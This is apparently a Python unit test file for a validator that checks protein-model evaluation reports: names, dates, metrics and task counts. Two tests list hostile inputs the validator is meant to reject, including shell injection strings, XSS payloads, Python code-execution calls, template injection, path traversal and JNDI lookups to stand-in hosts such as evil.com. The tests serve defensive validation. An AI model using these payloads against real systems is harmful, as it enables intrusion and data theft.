import unittest
from datetime import datetime, timedelta

from biotrainer_core.data_classes.autoeval import AutoEvalReport
from autoeval_service.service.autoeval_report_validator import AutoEvalReportValidator, MAX_ALLOWED_TIME_DELTA


class TestAutoEvalReportValidator(unittest.TestCase):

    def setUp(self):
        # Load the attached example report
        self.example_report = AutoEvalReport.from_json_file("example_report.json")

    def test_example_report_valid(self):
        """The example report attached to the issue (which is in development mode) should be valid."""
        # Set training date to today so date check does not expire
        self.example_report.training_date = datetime.now().strftime("%Y-%m-%d")
        validator = AutoEvalReportValidator(self.example_report)
        self.assertIsNone(validator.validate())
        self.assertTrue(self.example_report.is_development())

    def test_embedder_name_validation(self):
        """Test valid and invalid embedder names."""
        report = AutoEvalReport.model_validate(self.example_report.model_dump())
        report.training_date = datetime.now().strftime("%Y-%m-%d")

        # Valid predefined embedder
        report.embedder_name = "one_hot_encoding"
        self.assertIsNone(AutoEvalReportValidator.validate_embedder_name(report))

        # Valid HF model names
        report.embedder_name = "facebook/esm2_t30_150M_UR50D"
        self.assertIsNone(AutoEvalReportValidator.validate_embedder_name(report))
        report.embedder_name = "bert-base-uncased"
        self.assertIsNone(AutoEvalReportValidator.validate_embedder_name(report))

        # Empty
        report.embedder_name = ""
        self.assertIsNotNone(AutoEvalReportValidator.validate_embedder_name(report))

        # Too long (> 150 chars)
        report.embedder_name = "a" * 151
        self.assertIsNotNone(AutoEvalReportValidator.validate_embedder_name(report))

        # Invalid characters / script injection attempts
        for invalid_name in [
            "<script>alert(1)</script>",
            "model; rm -rf /",
            "model && whoami",
            "model | cat /etc/passwd",
            "../../etc/passwd",
            "facebook//esm2",
            "/facebook/esm2",
            "facebook/esm2/",
            "model name with spaces",
            "model\x00null",
            "{{ 7 * 7 }}",
            "${jndi:ldap://evil.com}",
        ]:
            report.embedder_name = invalid_name
            error = AutoEvalReportValidator.validate_embedder_name(report)
            self.assertIsNotNone(error, f"Expected error for embedder name: {invalid_name}")

    def test_security_injection_detection(self):
        """Test detection of malicious payloads and code injection attempts anywhere in the report."""
        report_dict = self.example_report.model_dump()
        report_dict["training_date"] = datetime.now().strftime("%Y-%m-%d")

        # Test script injection in a nested task member / dictionary value
        malicious_payloads = [
            "<script>alert('XSS')</script>",
            "</script><script>alert(1)</script>",
            "<iframe src='http://attacker.com'></iframe>",
            "<img src='x' onerror='alert(1)'>",
            "<svg onload='alert(1)'>",
            "javascript:alert(1)",
            "__import__('os').system('id')",
            "eval('1+1')",
            "exec('import os')",
            "os.system('ls')",
            "subprocess.Popen(['bash'])",
            "sh -c whoami",
            "{{ 7*7 }}",
            "${jndi:ldap://evil.com/a}",
            "../../secret_file",
            "malicious\x00data",
        ]

        for payload in malicious_payloads:
            # Inject payload into a nested structure (e.g. single protein result / protein name)
            rep = AutoEvalReport.model_validate(report_dict)
            if rep.zeroshot_contact_results and "PBC_ZEROSHOT_CONTACT" in rep.zeroshot_contact_results:
                zs_contact = rep.zeroshot_contact_results["PBC_ZEROSHOT_CONTACT"]
                zs_contact.per_protein_results[payload] = list(zs_contact.per_protein_results.values())[0]
                validator = AutoEvalReportValidator(rep)
                err = validator.validate()
                self.assertIsNotNone(err, f"Expected injection detection for payload: {payload}")
                self.assertIn("Potential security issue", err or "")

    def test_framework_names_validation(self):
        """Test validation of framework names."""
        report = AutoEvalReport.model_validate(self.example_report.model_dump())
        report.training_date = datetime.now().strftime("%Y-%m-%d")

        # Valid frameworks pass
        self.assertIsNone(AutoEvalReportValidator.validate_framework_names(report))

        # Unknown framework in supervised_results
        report.supervised_results["MALICIOUS_SUPERVISED"] = report.supervised_results["PBC_SUPERVISED"]
        self.assertIsNotNone(AutoEvalReportValidator.validate_framework_names(report))

        # Reset and test zeroshot
        report = AutoEvalReport.model_validate(self.example_report.model_dump())
        report.zeroshot_results["UNKNOWN_ZEROSHOT"] = report.zeroshot_results["PGYM"]
        self.assertIsNotNone(AutoEvalReportValidator.validate_framework_names(report))

    def test_training_date_validation(self):
        """Test training date validation rules."""
        report = AutoEvalReport.model_validate(self.example_report.model_dump())

        # Valid today
        report.training_date = datetime.now().strftime("%Y-%m-%d")
        self.assertIsNone(AutoEvalReportValidator.validate_training_date(report))

        # Invalid format
        report.training_date = "28-07-2026"
        self.assertIn("Invalid date format", AutoEvalReportValidator.validate_training_date(report) or "")

        # Future date (> tomorrow)
        future_date = (datetime.now() + timedelta(days=5)).strftime("%Y-%m-%d")
        report.training_date = future_date
        self.assertIn("Training date cannot be in the future", AutoEvalReportValidator.validate_training_date(report) or "")

        # Old date (> MAX_ALLOWED_TIME_DELTA)
        old_date = (datetime.now() - MAX_ALLOWED_TIME_DELTA - timedelta(days=5)).strftime("%Y-%m-%d")
        report.training_date = old_date
        self.assertIn("cannot be older than", AutoEvalReportValidator.validate_training_date(report) or "")

    def test_metric_values_validation(self):
        """Test numeric validation of metric estimates and bootstrapped metrics."""
        report = AutoEvalReport.model_validate(self.example_report.model_dump())
        report.training_date = datetime.now().strftime("%Y-%m-%d")

        # Valid report metrics
        self.assertIsNone(AutoEvalReportValidator.validate_metric_values(report))

        # Inverted confidence interval (lower > upper) in zero-shot metric
        report.zeroshot_results["PGYM"].task_results["PGYM-virus"].scc.lower = 0.9
        report.zeroshot_results["PGYM"].task_results["PGYM-virus"].scc.upper = 0.1
        err = AutoEvalReportValidator.validate_metric_values(report)
        self.assertIsNotNone(err)
        self.assertIn("Invalid confidence interval", err or "")

        # NaN metric value
        report = AutoEvalReport.model_validate(self.example_report.model_dump())
        report.zeroshot_results["PGYM"].task_results["PGYM-virus"].scc.mean = float("nan")
        err = AutoEvalReportValidator.validate_metric_values(report)
        self.assertIsNotNone(err)
        self.assertIn("non-finite", err or "")

        # Correlation out of [-1, 1] range
        report = AutoEvalReport.model_validate(self.example_report.model_dump())
        report.zeroshot_results["PGYM"].task_results["PGYM-virus"].scc.mean = 2.5
        err = AutoEvalReportValidator.validate_metric_values(report)
        self.assertIsNotNone(err)
        self.assertIn("out of expected correlation range", err or "")


    def test_supervised_results_validation(self):
        """Test validation rules for supervised PBC results."""
        report = AutoEvalReport.model_validate(self.example_report.model_dump())
        report.training_date = datetime.now().strftime("%Y-%m-%d")

        # Valid supervised results
        self.assertIsNone(AutoEvalReportValidator.validate_supervised_results(report))

        # Missing PBC_SUPERVISED key when supervised_results is non-empty
        pbc = report.supervised_results.pop("PBC_SUPERVISED")
        report.supervised_results["FLIP"] = pbc
        self.assertEqual(AutoEvalReportValidator.validate_supervised_results(report),
                         "Supervised results must contain PBC task.")

        # Wrong number of tasks
        report.supervised_results["PBC_SUPERVISED"] = pbc
        del report.supervised_results["FLIP"]
        pbc_keys = list(pbc.results.keys())
        del pbc.results[pbc_keys[0]]
        self.assertIn("tasks", AutoEvalReportValidator.validate_supervised_results(report) or "")

        # Invalid min/max sequence length
        report = AutoEvalReport.model_validate(self.example_report.model_dump())
        report.supervised_results["PBC_SUPERVISED"].min_seq_len = 10
        self.assertIn("min_seq_len=0 and max_seq_len=2000",
                      AutoEvalReportValidator.validate_supervised_results(report) or "")

    def test_zeroshot_contact_validation(self):
        """Test validation for zero-shot contact results."""
        report = AutoEvalReport.model_validate(self.example_report.model_dump())
        report.training_date = datetime.now().strftime("%Y-%m-%d")

        self.assertIsNone(AutoEvalReportValidator.validate_zeroshot_contact_results(report))

        # Missing PBC_ZEROSHOT_CONTACT when zeroshot_contact_results is non-empty
        zs_contact = report.zeroshot_contact_results.pop("PBC_ZEROSHOT_CONTACT")
        report.zeroshot_contact_results["OTHER_CONTACT"] = zs_contact
        self.assertEqual(AutoEvalReportValidator.validate_zeroshot_contact_results(report),
                         "Zeroshot contact results must contain PBC framework.")

        # Unexpected task in contact results
        del report.zeroshot_contact_results["OTHER_CONTACT"]
        report.zeroshot_contact_results["PBC_ZEROSHOT_CONTACT"] = zs_contact
        zs_contact.task_results["malicious_task"] = list(zs_contact.task_results.values())[0]
        # wrong count
        self.assertIn("3 tasks", AutoEvalReportValidator.validate_zeroshot_contact_results(report) or "")

    def test_supervised_contact_validation(self):
        """Test validation for supervised contact results."""
        report = AutoEvalReport.model_validate(self.example_report.model_dump())
        report.training_date = datetime.now().strftime("%Y-%m-%d")

        self.assertIsNone(AutoEvalReportValidator.validate_supervised_contact_results(report))

        # Missing PBC_SUPERVISED_CONTACT when supervised_contact_results is non-empty
        sup_contact = report.supervised_contact_results.pop("PBC_SUPERVISED_CONTACT")
        report.supervised_contact_results["OTHER_CONTACT"] = sup_contact
        self.assertEqual(AutoEvalReportValidator.validate_supervised_contact_results(report),
                         "Supervised contact results must contain PBC framework.")

        # Wrong count
        del report.supervised_contact_results["OTHER_CONTACT"]
        report.supervised_contact_results["PBC_SUPERVISED_CONTACT"] = sup_contact
        sup_keys = list(sup_contact.task_results.keys())
        del sup_contact.task_results[sup_keys[0]]
        self.assertIn("3 tasks", AutoEvalReportValidator.validate_supervised_contact_results(report) or "")


if __name__ == "__main__":
    unittest.main()
